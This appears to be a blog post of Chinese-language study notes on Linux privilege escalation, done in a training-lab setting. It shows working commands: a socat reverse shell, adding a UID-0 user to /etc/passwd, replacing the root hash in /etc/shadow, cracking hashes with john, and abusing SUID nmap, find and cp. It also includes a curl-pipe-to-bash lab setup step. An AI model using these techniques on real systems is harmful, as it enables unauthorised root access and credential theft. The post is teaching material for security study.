I"o<p>上次在实验楼看到一个关于linux提权的训练营，写的非常好，不过过了一段时间忘得也差不多了，这次就趁着楼赛再复习一遍吧。<br />
 		 <a href="#一-passwd文件提权"><strong>一.<code class="language-plaintext highlighter-rouge">passwd</code> 文件提权</strong></a><br />
 		 <a href="#二-shadow文件提权"><strong>二.<code class="language-plaintext highlighter-rouge">shadow</code> 文件提权</strong></a><br />
		 <a href="#三-suid提权"><strong>三.<code class="language-plaintext highlighter-rouge">SUID</code> 可执行文件提权</strong></a><br />
		 <a href="#四-cronjobs提权"><strong>四.<code class="language-plaintext highlighter-rouge">Cron Jobs</code> 定时任务提权</strong></a><br />
		 <a href="#五-通配符注入提权"><strong>五.通配符注入提权</strong></a><br />
		 <a href="#六-sudo提权"><strong>六.<code class="language-plaintext highlighter-rouge">sudo</code> 滥用提权</strong></a><br />
		 <a href="#七-查找敏感文件提权"><strong>七.敏感文件提权</strong></a><br />
		 <a href="#八-跳板用户提权"><strong>八.跳板用户提权</strong></a><br />
		 <a href="#九-内核漏洞提权"><strong>九.<code class="language-plaintext highlighter-rouge">Linux</code> 内核漏洞提权</strong></a><br />
		 <a href="#十-暴力破解提权"><strong>十.暴力破解提权</strong></a><br />
		 <a href="#十一-自动化提权工具"><strong>十一.自动化提权</strong></a></p>

<h3 id="预备将垃圾shell升级成具有交互功能的shell">预备：将垃圾shell升级成具有交互功能的shell</h3>

<p>「简单 shell」不方便的地方体现在下面几个方面：</p>

<ul>
  <li>不支持 <code class="language-plaintext highlighter-rouge">su</code>、<code class="language-plaintext highlighter-rouge">ssh</code> 等需要交互的命令。</li>
  <li>命令执行错误时的“<code class="language-plaintext highlighter-rouge">标准错误信息（STDERR）</code>”不会被打印出来。</li>
  <li>不能完整支持 vim/vi 编辑器。</li>
  <li>不支持命令 tab 键自动补全功能，不支持「上下方向键」显示历史命令。</li>
</ul>

<h4 id="通过-python-创建伪终端升级">通过 Python 创建「伪终端」升级</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pty</span> 
<span class="n">pty</span><span class="p">.</span><span class="n">spawn</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">)</span>
</code></pre></div></div>

<p>Python 创建的伪终端解决了以下问题：</p>

<ul>
  <li>支持命令交互式输入</li>
  <li>支持打印命令执行错误时的“<code class="language-plaintext highlighter-rouge">标准错误信息（STDERR）</code>”</li>
</ul>

<p>但是 Python 创建的伪终端仍然存在的问题：</p>

<ul>
  <li>不支持 tab 自行不全、使用「上下方向键」显示历史命令：</li>
  <li>不支持 vim/vi 编辑文件</li>
</ul>

<h4 id="使用-socat-进行升级">使用 socat 进行升级</h4>

<p>* 需要主机支持<code class="language-plaintext highlighter-rouge">socat</code>命令</p>

<p>然后<strong>新建一个终端</strong>，使用如下命令在本地监听 5912 端口：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat file:<span class="sb">`</span><span class="nb">tty</span><span class="sb">`</span>,raw,echo<span class="o">=</span>0 tcp-listen:5912
</code></pre></div></div>

<p>然后在「简单 shell」 中执行如下命令，反弹一个完整的 TTY-shell：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>socat <span class="nb">exec</span>:<span class="s1">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:127.0.0.1:5912
</code></pre></div></div>

<p>这种方式反弹回的 shell 最为完整，但需要目标主机支持 <code class="language-plaintext highlighter-rouge">socat</code> 工具。</p>

<h3 id="一-passwd文件提权">一. passwd文件提权</h3>

<p>通常来说，通过 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 提权的方法有两种：</p>

<ol>
  <li>
    <p><strong>如果具有 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 的 w (写入) 权限，可以直接添加一个 root 权限的用户</strong></p>

    <blockquote>
      <p><strong>自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 <code class="language-plaintext highlighter-rouge">UID</code> 设置为 <code class="language-plaintext highlighter-rouge">0</code>，此时我们登陆就可以获取 root 权限。</strong></p>
    </blockquote>
  </li>
</ol>

<p><strong>第一步-先设置用户名</strong>：将用户名从 root 修改为其他任意用户名即可，例如 <code class="language-plaintext highlighter-rouge">syl-passwd：</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syl-passwd:x:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p><strong>第二步-设置密码</strong>：之前讲到过，第二个字段 x 表示该用户密码存放在 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件中，如果密码不用存在 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 中，可以直接将 <code class="language-plaintext highlighter-rouge">x</code> 替换为 <code class="language-plaintext highlighter-rouge">「密码」</code> 即可。</p>

<p>但需要注意的是，这里的<code class="language-plaintext highlighter-rouge">「密码」</code> 并不是指明文密码，而是经过 hash 算法加密之后的密文字符串，那如何计算 hash 字符串呢？我们可以使用 <code class="language-plaintext highlighter-rouge">openssl</code>套件。</p>

<p>使用 <code class="language-plaintext highlighter-rouge">openssl</code>创建一个密码为 pass123 的 linux hash，命令如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> ignite pass123
</code></pre></div></div>

<p>参数解释：</p>

<ul>
  <li>-1 ：使用 MD5 hash 算法</li>
  <li>-salt ：对 hash 算法加 “盐”</li>
</ul>

<p>计算得到的 hash 为<code class="language-plaintext highlighter-rouge">$1$ignite$3eTbJm98O9Hz.k1NTdNxe1</code>，用它来替换 x，最终我们构造出的 passwd 用户数据如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>syl-passwd:<span class="nv">$1$ignite$3eTbJm98O9Hz</span>.k1NTdNxe1:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>接下来将它添加到 passwd 文件中：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> /etc/passwd
</code></pre></div></div>

<p>注意：</p>

<ol>
  <li>必须使用单引号，不能使用双引号</li>
  <li>
    <p>使用 <code class="language-plaintext highlighter-rouge">&gt;&gt;</code> ，而不是 <code class="language-plaintext highlighter-rouge">&gt;</code></p>
  </li>
  <li><strong>如果 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 中存储 root 用户密码哈希，可以使用 john 进行破解</strong></li>
</ol>

<p>john 会调用指定字典对 hash 字符串进行破解，破解时间取决于字典大小和计算机性能。john 支持使用内置字典，也可以指定自定义字典，本课程中我们使用 john 自带字典完成破解。</p>

<p>先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 此处必须单引号</span>
<span class="nb">echo</span> <span class="s1">'root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;</span> ~/hash.txt
</code></pre></div></div>

<p>然后使用 john 进行破解：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="o">[</span><span class="nt">--show</span><span class="o">]</span> ~/hash.txt
</code></pre></div></div>

<p>注意：</p>

<p>john 工具对于同一个破解文件中的同一条 hash 记录只会爆破一次，如果第二次执行 <code class="language-plaintext highlighter-rouge">john ~/hash.txt</code> 是不会得到结果的，如果想查看上一次爆破的结果，需要使用 <code class="language-plaintext highlighter-rouge">--show</code> 参数</p>

<h3 id="二-shadow文件提权">二. shadow文件提权</h3>

<p><code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件用于存储<strong>加密后的密码</strong>和密码相关的配置信息，该文件的每一行代表一个用户，每行都包含 9 个字段，用冒号(“:”)隔开，顺序如下：</p>

<ol>
  <li>用户名</li>
  <li>加密后的密码</li>
  <li>上次修改密码的时间(从 1970.1.1 开始的总天数)</li>
  <li>两次修改密码间隔的最少天数，如果为 0，则没有限制</li>
  <li>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为 99999 则没有限制</li>
  <li>提前多少天警告用户密码将过期</li>
  <li>在密码过期之后多少天禁用此用户</li>
  <li>用户过期日期(从 1970.1.1 开始的总天数)，如果为 0，则该用户永久可用</li>
  <li>保留，未来使用</li>
</ol>

<p>例如，假设 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件中其中一行信息如下：</p>

<p><img src="..\images\2021-01-23_01.jpg" alt="pic" /></p>

<p>其含义解读如下：</p>

<ul>
  <li>用户名：test-user</li>
  <li>加密后的密码：<code class="language-plaintext highlighter-rouge">$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0</code></li>
  <li>上次修改密码的时间(从 1970.1.1 开始的总天数为 17470)</li>
  <li>两次修改密码最小间隔天数：没有限制</li>
  <li>两次修改密码最大间隔天数：没有限制</li>
  <li>提前 7 天警告用户密码将过期</li>
  <li>该用户永久可用</li>
</ul>

<p>默认情况下，只有 root 权限才能读取和修改 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件，但有时候由于系统管理员的错误配置，也会给我们带来可乘之机。</p>

<p>通常来说，通过  <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 提权的方法有两种：</p>

<ol>
  <li>如果具有  <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 的 w (写入) 权限，可以直接<strong>修改</strong> root 密码</li>
  <li>如果具有  <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 的 r (读取) 权限，可以通过读取 root 用户密码并使用 john 进行破解</li>
</ol>

<p><strong>编辑/etc/shadow 文件，将 root 用户的密码篡改。</strong></p>

<p>命令查看 shadow 文件中 root 用户的密码配置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/shadow|grep root
</code></pre></div></div>

<p><img src="..\images\2021-01-23_02.jpg" alt="pic" /></p>

<p>得到的结果是：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:<span class="k">**</span><span class="nv">$6$5PfZMEbQ$pCjxwZagiIqsrkL4V6r3flOiKQrheDV5eup3zicnvBSKPItaddhUfDAVA5GWAYUHX9LQ5kXzLH8ehoUno2qkE</span>/<span class="k">**</span>:18167:0:99999:7:::
</code></pre></div></div>

<p>我们只需要替换第一个<code class="language-plaintext highlighter-rouge">:</code>和第二个<code class="language-plaintext highlighter-rouge">:</code>之前的字符串，这是经过加密之后的密码哈希。</p>

<p>生成密码的方法和上一章中的一样，需要使用到 <code class="language-plaintext highlighter-rouge">openssl</code> 套件，创建一个密码为 pass123 的 linux hash，命令如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> ignite pass123
</code></pre></div></div>

<p>参数解释：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">-1</code> ：使用 MD5 hash 算法</li>
  <li><code class="language-plaintext highlighter-rouge">-salt</code> ：对 hash 算法加 “盐”</li>
</ul>

<p><img src="..\images\2021-01-23_03.jpg" alt="pic" /></p>

<p>计算得到的 hash 为:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
</code></pre></div></div>

<p>使用 vim 编辑 <code class="language-plaintext highlighter-rouge">etc/shadow</code>，替换密码哈希：</p>

<p><img src="..\images\2021-01-23_04.gif" alt="pic" /></p>

<p>使用 cat 命令确认一下是否修改成功：</p>

<p><img src="..\images\2021-01-23_05.jpg" alt="pic" /></p>

<p>确认添加成功后，使用  <code class="language-plaintext highlighter-rouge">su root</code> 切换到 root 用户，密码为 pass123:</p>

<p><img src="..\images\2021-01-23_06.jpg" alt="pic" /></p>

<p>至此，我们成功获取到 Linux 系统的最高权限 —— root 权限。</p>

<p>和之前一样，使用如下命令查看 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 和 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件的权限：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-alh</span> /etc/passwd /etc/shadow
</code></pre></div></div>

<p><img src="..\images\2021-01-23_07.jpg" alt="pic" /></p>

<p>从输出结果中我们发现，<code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件其他用户也具有读取<code class="language-plaintext highlighter-rouge">(r)</code>权限，导致我们可以直接读取  <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 的内容：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/shadow
</code></pre></div></div>

<p><img src="..\images\2021-01-23_08.jpg" alt="pic" /></p>

<p>可以看到，<code class="language-plaintext highlighter-rouge">shadow</code> 文件中记录了 root 用户的密码哈希，接下来我们使用 john 工具来破解。</p>

<p>Kali Linux 上默认安装了该工具，但在 ubuntu 实验机器上需要自己安装。打开一个新终端，输入如下命令进行安装：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>john
</code></pre></div></div>

<p><img src="..\images\2021-01-23_09.gif" alt="Kapture 2020-07-04 at 15.34.23" /></p>

<p>john 会调用指定字典对 hash 字符串进行破解，破解时间取决于字典大小和计算机性能。</p>

<p>john 支持使用内置字典，也可以使用用户自己的自定义字典，本课程中我们使用 john 自带字典完成破解。</p>

<p><strong>不过在开始破解之前，还有一步要做：</strong></p>

<p>在实战环境中，我们需要先将 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 和 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 的内容合并，否者 john 可能无法识别 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 中的内容。</p>

<p>需要使用到 <code class="language-plaintext highlighter-rouge">unshadow</code> 命令：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 注意 passwd 必须是第一个参数 unshadow /etc/passwd /etc/shadow &gt;
~/shadow_crack.txt
</code></pre></div></div>

<p><img src="..\images\2021-01-23_10.jpg" alt="pic" /></p>

<p>接下来就可以使用 john 来破解 <code class="language-plaintext highlighter-rouge">shadow_crack.txt</code> ，john 会自动加载所有识别到的用户 hash 并按次序破解：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john ~/shadow_crack.txt
</code></pre></div></div>

<p>稍微等待一下，成功破解出 root 密码：</p>

<p><img src="..\images\2021-01-23_11.jpg" alt="pic" /></p>

<p>使用 su root 命令切换到 root 用户：</p>

<p><img src="..\images\2021-01-23_12.gif" alt="Kapture 2020-07-04 at 15.53.36" /></p>

<p>至此，我们成功提权到 root 用户。</p>

<h3 id="三-suid提权">三. SUID提权</h3>

<p>通常情况下，Linux 运行一个程序，是使用当前运行这个程序的用户权限，这种机制是非常合理的，但有一些程序比较特殊，比如我们常用的 <code class="language-plaintext highlighter-rouge">ping</code> 命令。</p>

<p><code class="language-plaintext highlighter-rouge">ping</code> 需要发送 ICMP 报文，这个操作需要发送 Raw Socket，而使用 Raw Socket 是需要 <code class="language-plaintext highlighter-rouge">root</code> 权限，那怎么才能让普通用户也能使用 <code class="language-plaintext highlighter-rouge">ping</code> 命令呢？这时候就要使用到 <code class="language-plaintext highlighter-rouge">suid</code>。</p>

<p><code class="language-plaintext highlighter-rouge">suid</code> 全称是 <strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution ，<strong>即——使文件在执行时拥有文件所有者的权限。</strong></p>

<p>我们使用如下命令查看 <strong>ping</strong> 命令的权限设置：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-alh</span> /bin/ping
</code></pre></div></div>

<p><img src="..\images\2021-01-23_13.jpg" alt="图片描述" /> 你会发现 <code class="language-plaintext highlighter-rouge">ping</code> 的权限中多了一个 <code class="language-plaintext highlighter-rouge">s</code>，这就是 <strong>suid</strong>。因此无论任何用户在执行 <code class="language-plaintext highlighter-rouge">ping</code> 命令时，<code class="language-plaintext highlighter-rouge">ping</code> 命令本身都将拥有其所有者的权限，而 <code class="language-plaintext highlighter-rouge">ping</code> 的所有者是 root 用户，所以 <code class="language-plaintext highlighter-rouge">ping</code> 就拥有了 root 权限。</p>

<p>试想，如果拥有 <code class="language-plaintext highlighter-rouge">suid</code> 权限（root）的某文件提供了文件修改、执行系统命令的功能，那就能被攻击者恶意利用来提升系统权限——这就是 SUID 提权的原理。</p>

<p>下面给大家介绍几种常用的 SUID 提权方法。</p>

<h4 id="1nmap提权">1.nmap提权</h4>

<p>当使用 <code class="language-plaintext highlighter-rouge">nmap</code> 进行「UDP 扫描」或「SYN 扫描」时，需要调用 Raw Socket，因此需要 root 权限。</p>

<p><code class="language-plaintext highlighter-rouge">nmap</code> 默认不具有 <code class="language-plaintext highlighter-rouge">suid</code> 权限，每次使用的都需要加上 <code class="language-plaintext highlighter-rouge">sudo</code>：</p>

<p><img src="..\images\2021-01-23_14.jpg" alt="图片描述" /></p>

<p>有些管理员为了使用方便，便给 nmap 加上了 <code class="language-plaintext highlighter-rouge">s</code> 权限。</p>

<p>但别忘了，仅具有 s 权限是不能用于提权的，还需要该文件拥有<code class="language-plaintext highlighter-rouge">执行系统命令</code>或<code class="language-plaintext highlighter-rouge">修改文件</code>的功能，恰巧 nmap <code class="language-plaintext highlighter-rouge">2.02~5.21</code> 版本提供了执行系统命令的功能。</p>

<p>使用命令 nmap –version 查看实验环境中 nmap 的版本：</p>

<p><img src="..\images\2021-01-23_15.jpg" alt="图片描述" /></p>

<p>恰好是 <code class="language-plaintext highlighter-rouge">2.01~5.21</code> 之间的版本，此版本可使用命令 <code class="language-plaintext highlighter-rouge">nmap --interactive</code> 进入一个交互界面，在该模式下输入 <code class="language-plaintext highlighter-rouge">!sh</code> 便可获取一个 shell，如下图所示：</p>

<p><img src="..\images\2021-01-23_16.gif" alt="图片描述" /></p>

<p>由于此时 nmap 并不具有 <code class="language-plaintext highlighter-rouge">s</code> 权限，因此获取到的 shell 为 shiyanlou 用户权限。</p>

<p>使用如下命令给 nmap 加上 <code class="language-plaintext highlighter-rouge">s</code> 权限：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo chmod </span>u+s /usr/bin/nmap
</code></pre></div></div>

<p><img src="..\images\2021-01-23_17.gif" alt="图片描述" /></p>

<p>此时 nmap 已经拥有了 s 权限，且文件所有者为 root 用户，再尝试以上方法便可获得 root 权限的 shell。</p>

<h4 id="2find-提权">2.find 提权</h4>

<p>当 find 命令具有 s 权限时，可以借助 find 执行系统命令从而提权。</p>

<p>使用命令 <code class="language-plaintext highlighter-rouge">ls -alh /usr/bin/find</code> 查看 <code class="language-plaintext highlighter-rouge">find</code> 命令权限：</p>

<p><img src="..\images\2021-01-23_18.jpg" alt="图片描述" /></p>

<p>find 执行系统命令的语法如下:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find &lt;file&gt; <span class="nt">-exec</span> &lt;<span class="nb">command</span><span class="o">&gt;</span> <span class="se">\;</span>
</code></pre></div></div>

<p>其中 `` 可以为任意文件，因此我们可以先使用 <code class="language-plaintext highlighter-rouge">touch</code> 命令创建一个文件 <code class="language-plaintext highlighter-rouge">test</code>：</p>

<p><img src="..\images\2021-01-23_19.jpg" alt="图片描述" /></p>

<p>然后通过 test 文件执行命令:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">test</span> <span class="nt">-exec</span> <span class="nb">whoami</span> <span class="se">\;</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_20.jpg" alt="图片描述" /></p>

<p>这样就能以 root 权限执行命令了，但每次执行命令都要这样写未免很麻烦，并且正如之前我们在<strong>「TTY shell」</strong>中我们讲到了，这种方式并不支持需要交互的命令，例如 <code class="language-plaintext highlighter-rouge">ssh、su</code> 等。</p>

<p><strong>同学们可以稍微思考一下：如何获取一个更方便的 root 权限的 shell 呢？</strong></p>

<p>其实方法很简单，我们可以直接执行 /bin/bash 命令即可：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">test</span> <span class="nt">-exec</span> /bin/bash <span class="nt">-p</span> <span class="se">\;</span>
</code></pre></div></div>

<blockquote>
  <p>注意：必须使用 <code class="language-plaintext highlighter-rouge">-p</code> 参数，否者无法获取 root 权限，至于原因可以参看我写的<a href="https://zhuanlan.zhihu.com/p/156795223">这篇文章</a>，这里不再赘述。</p>
</blockquote>

<p><img src="..\images\2021-01-23_21.jpg" alt="图片描述" /></p>

<h4 id="3cp-和-mv-命令">3.cp 和 mv 命令</h4>

<p>当 <code class="language-plaintext highlighter-rouge">cp</code> 和 <code class="language-plaintext highlighter-rouge">move</code> 命令具有 s 权限时，可以通过覆盖 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 或 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 文件，从而获取 root 权限。</p>

<p>使用命令 <code class="language-plaintext highlighter-rouge">ls -alh /bin/cp</code> 查看 <code class="language-plaintext highlighter-rouge">cp</code> 命令权限，可以看到 <code class="language-plaintext highlighter-rouge">cp</code>已经有了 s 权限：</p>

<p><img src="..\images\2021-01-23_22.jpg" alt="图片描述" /></p>

<p>先将 <code class="language-plaintext highlighter-rouge">/etc/passwd</code> 的内容复制一份到用户主目录下 <code class="language-plaintext highlighter-rouge">~/passwd</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd <span class="o">&gt;</span> ~/passwd
</code></pre></div></div>

<blockquote>
  <p>此处不使用 cp 进行复制，因为 cp 会将文件权限一起复制。</p>
</blockquote>

<p><img src="..\images\2021-01-23_23.jpg" alt="图片描述" /></p>

<p>然后利用之前在「<strong>Linux 提权之 passwd 文件提权</strong>」这一章节中提到的方法，我们创建一行用户数据如下：</p>

<ul>
  <li>用户名：hacked</li>
  <li>密码：pass123</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hacked:<span class="nv">$1$ignite$3eTbJm98O9Hz</span>.k1NTdNxe1:0:0:root:/root:/bin/bash
</code></pre></div></div>

<p>然后将这行添加到 <code class="language-plaintext highlighter-rouge">~/passwd</code> 文件中：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'hacked:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash'</span> <span class="o">&gt;&gt;</span> ~/passwd
</code></pre></div></div>

<p><img src="..\images\2021-01-23_24.jpg" alt="图片描述" /></p>

<p>最后，通过 <code class="language-plaintext highlighter-rouge">cp</code> 命令的 s 权限，用 <code class="language-plaintext highlighter-rouge">~/passwd</code> 覆盖 <code class="language-plaintext highlighter-rouge">/etc/passwd</code>：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> ~/passwd /etc/passwd
</code></pre></div></div>

<p>覆盖完成后，通过 <code class="language-plaintext highlighter-rouge">su hacked</code> 命令切换即可切换到 hacked 用户（密码 pass123）：</p>

<p><img src="..\images\2021-01-23_25.jpg" alt="图片描述" /></p>

<p>由于 hacked 用户的 <code class="language-plaintext highlighter-rouge">uid=0</code>，因此我们切换之后成功获取到 root 权限。</p>

<p><code class="language-plaintext highlighter-rouge">move</code> 命令的提权方法和 <code class="language-plaintext highlighter-rouge">cp</code> 命令非常类似，这里就不再赘述，同学们可以自行尝试一下，如果你有问题欢迎留言。</p>

<p>以上已经给大家介绍了多种 SUID 可执行文件的提权方法，实际上可用于 SUID 提权的还有很多，这里就不给大家一一列举了，可以通过以下网址查询提权方法：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/iSecurity-Club/Pentest-Methodologies/tree/master/PostExploit/LinuxPE/SUID/Summary
</code></pre></div></div>

<p><img src="..\images\2021-01-23_26.jpg" alt="图片描述" /></p>

<p>通过搜索找到对应的命令，查看详情便可知道具体提权方法。</p>

<h4 id="4如何查找-suid-可执行文件">4.如何查找 SUID 可执行文件</h4>

<p>在实战中，我们可以使用如下命令来查找主机上所有具有 <code class="language-plaintext highlighter-rouge">s</code> 权限的可执行文件：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-print</span> 2&gt;/dev/null
find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div></div>

<p><img src="..\images\2021-01-23_27.jpg" alt="图片描述" /></p>

<p>但是查询结果中，通常有大量的无法利用来提权的可执行文件，需要人工进行分析。</p>

<p>有没有办法通过自动化脚本来自动分析呢？有的，我写了一个简单的脚本来完成自动化分析，项目地址如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/Jewel591/suidcheck
</code></pre></div></div>

<p><img src="..\images\2021-01-23_28.jpg" alt="图片描述" /></p>

<p>使用 <code class="language-plaintext highlighter-rouge">wget</code> 下载 <code class="language-plaintext highlighter-rouge">suidcheck.sh</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/Jewel591/suidcheck/master/suidcheck.sh
</code></pre></div></div>

<p>给 <code class="language-plaintext highlighter-rouge">suidcheck.sh</code> 加上可执行权限并执行：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x suidcheck.sh
./suidcheck.sh
</code></pre></div></div>

<p><img src="..\images\2021-01-23_29.gif" alt="图片描述" /></p>

<p>红框中的结果，就是可用来提权的可执行文件：</p>

<p><img src="..\images\2021-01-23_30.jpg" alt="图片描述" /></p>

<p>实际上可通过 SUID 提权的命令远不止这三种，例如 <code class="language-plaintext highlighter-rouge">cat、vim、more、sed</code> 等命令也都可以进行 SUID 提权，但只要你掌握实验中提到的<strong>提权思路</strong>，其他命令也就能融会贯通了。</p>

<h3 id="四-cronjobs提权">四. CronJobs提权</h3>

<h4 id="1什么是-cron-定时任务">1.什么是 Cron 定时任务</h4>

<p>Cron Jobs 是 Linux 系统中的「定时任务」，常被用来安排那些需要周期性执行的命令，例如定期备份数据、定期清理缓存等功能，因为使用到 <code class="language-plaintext highlighter-rouge">cron</code> 工具（crontab），因此被称作 Cron Jobs。</p>

<p>CronJobs 作为系统管理员最常用的功能之一，本身是非常棒的一个工具，但如果「定时任务」被设定为以更高的用户权限运行（例如 root 用户），则可能会被黑客利用来提权。</p>

<p>crontab 命令使用语法如下：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>    <span class="k">*</span>    <span class="k">*</span>    <span class="k">*</span>    <span class="k">*</span>   <span class="o">[</span> user <span class="o">]</span> File/Command
-    -    -    -    -
|    |    |    |    |
|    |    |    |    +----- 星期中星期几 <span class="o">(</span>0 - 7<span class="o">)</span> <span class="o">(</span>星期天 为0<span class="o">)</span>
|    |    |    +---------- 月份 <span class="o">(</span>1 - 12<span class="o">)</span>
|    |    +--------------- 一个月中的第几天 <span class="o">(</span>1 - 31<span class="o">)</span>
|    +-------------------- 小时 <span class="o">(</span>0 - 23<span class="o">)</span>
+------------------------- 分钟 <span class="o">(</span>0 - 59<span class="o">)</span>
</code></pre></div></div>

<p>其中 <code class="language-plaintext highlighter-rouge">user</code> 是可选的，若不指定用户，则使用当前用户的权限指定。</p>

<p>需要注意的是，只有 root 用户才能指定以其他用户的权限来执行命令或脚本。</p>

<p>举个例子：</p>

<p>如果我们想实现每小时输出一次 Apache 报错日志，可以使用如下语句：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="nb">echo</span> /var/log/lastlog
</code></pre></div></div>

<p>因为<code class="language-plaintext highlighter-rouge">小时</code>、<code class="language-plaintext highlighter-rouge">天</code>、<code class="language-plaintext highlighter-rouge">月</code>、<code class="language-plaintext highlighter-rouge">周</code>都被设定为 <code class="language-plaintext highlighter-rouge">*</code>，因此每当分钟到达 0 时都会执行一次定时任务——即每小时执行一个。</p>

<p>那如果需要每两小时的第 15 分钟执行一次命令，应该如何实现呢？</p>

<p>我们只需要做一个简单的修改就可以了：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>15 <span class="k">*</span>/2 <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="nb">echo</span> /var/log/lastlog
</code></pre></div></div>

<p>下面我们通过一个示例来理解一下<code class="language-plaintext highlighter-rouge">cron</code> 的用法。</p>

<p>先执行如下命令初始化实验环境：</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://labfile.oss.aliyuncs.com/courses/2650/init_cronjobs.sh |bash
</code></pre></div></div>

<p><img src="..\images\2021-01-23_31.jpg" alt="图片描述" /></p>

